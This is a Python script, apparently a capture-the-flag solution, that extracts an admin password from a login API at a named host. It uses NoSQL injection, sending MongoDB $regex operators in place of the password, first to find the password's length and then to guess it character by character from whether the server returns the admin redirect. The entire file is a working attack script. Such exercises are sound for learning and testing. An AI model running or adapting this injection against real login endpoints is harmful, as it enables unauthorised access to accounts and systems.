import requests
import json

from itertools import product

# GET PASSWORD LENGTH #########################################################
logged_in_text = '{"url": "/admin"}'
password_prefix = "CTF"

password_body_len = -1
returned = ""

while returned != logged_in_text:
    password_body_len += 1

    payload = {'username' : 'admin', 'password' : {"$regex" : "^{}[A-Za-z]{}$".format(password_prefix, "{" + str(password_body_len) + "}"), "$options" : "i"}}
    r  = requests.post('http://cits4projtg2.cybernemosyne.xyz:1007/api/login', json=payload)
    returned = r.text


print("Password length: {}".format(password_body_len + len(password_prefix)))


# TEST CHARACTER POSITIONS ##################################################
password = [""] * password_body_len

chars_lower = [chr(ordinance) for ordinance in range(ord("a"), ord("z") + 1)]
chars_upper = [chr(ordinance) for ordinance in range(ord("A"), ord("Z") + 1)]

chars = chars_lower + chars_upper

for i in range(password_body_len):
    print("Trying position: {}".format(i))

    for char in chars:
        print("{} ".format(char), end="")

        left_len = "{" + str(i) + "}"
        right_len = "{" + str(password_body_len - (i + 1)) + "}"
        
        regex = "^{}[a-z]{}[{}][a-z]{}$".format(
            password_prefix, left_len, char, right_len
        )


        payload = {'username' : 'admin', 'password' : {"$regex" : regex}}
        r  = requests.post('http://cits4projtg2.cybernemosyne.xyz:1007/api/login', json=payload)

        if r.text == logged_in_text:
            password[i] = char
            print("MATCH")
            break
            
        print("no match")


password = password_prefix + "".join(password)

print("Matching password: {}".format(password))
